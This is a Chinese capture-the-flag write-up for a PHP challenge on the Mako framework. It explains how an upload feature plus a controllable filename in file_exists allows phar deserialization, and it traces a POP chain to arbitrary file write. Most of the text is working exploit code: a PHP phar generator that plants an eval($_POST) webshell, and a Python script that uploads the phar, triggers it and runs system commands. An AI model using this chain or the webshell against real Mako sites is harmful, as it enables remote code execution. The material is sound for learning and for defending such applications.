题目来源于暑假时候挖的一条鸡肋反序列化链XD

# 预期解

网站提供了两个功能：上传图片，编辑图片。上传图片没有任何的过滤，但是上传的路径并不在nginx root路径下，无法直接写马。

审计ImagesController#editGet，发现filename参数可控。跟进Image#__construct，会发现filename传入了file_exists函数里。所以这里可以触发一个phar反序列化漏洞。

接下来寻找mako framework的POP链。下面是一条可以做到任意文件写入的POP链。

```
mako\session#__destruct -> $this#commit -> $this->store#write

mako\session\stores\File#write -> $this->fileSystem#put

mako\file\FileSystem#put -> file_put_contents
```

生成phar (getPhar.php)

```php
<?php
namespace mako\file{
	class FileSystem{}
}
namespace mako\session\stores{
	class File  {
		protected $sessionPath="/var/www/mako/public";
		protected $fileSystem;
		public function __construct(){
			$this->fileSystem=new \mako\file\FileSystem();
		}
	}
}
namespace mako\session{
	class Session{
		protected $autoCommit=true;
		protected $flashData="<?php eval(\$_POST[1]);?>";
		protected $sessionData = [];
		protected $destroyed = false;
		protected $store;
		protected $sessionId="shell.php";
		public function __construct(){
			$this->store=new \mako\session\stores\File();
		}
	}
}
namespace {
	$o= new \mako\session\Session();
	@unlink("phar.phar");
	$phar = new Phar("phar.phar"); //后缀名必须为phar
	$phar->startBuffering();
	$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
	$phar->setMetadata($o); //将自定义的meta-data存入manifest
	$phar->addFromString("test.txt", "test"); //添加要压缩的文件
	//签名自动计算
	$phar->stopBuffering();
}
?>
```

exp.py

```python
import os
import requests
url='xxx'
def uploadPhar():
    os.system('php getPhar.php')
    requests.post(url+'/index.php/upload',files={'image':open('phar.phar','rb')})
def writeShell():
    requests.get(url+'/index.php/edit?filename=phar://phar.phar')
def getFlag():
    print(requests.post(url+'/shell.php',data={'1':'system("/readFlag");'}).text)
if __name__=='__main__':
    uploadPhar()
    writeShell()
    getFlag()
```
# 非预期解？

https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

文章介绍了利用 MSL Format 文件对 ImageMagick 类的初始化实现任意文件写入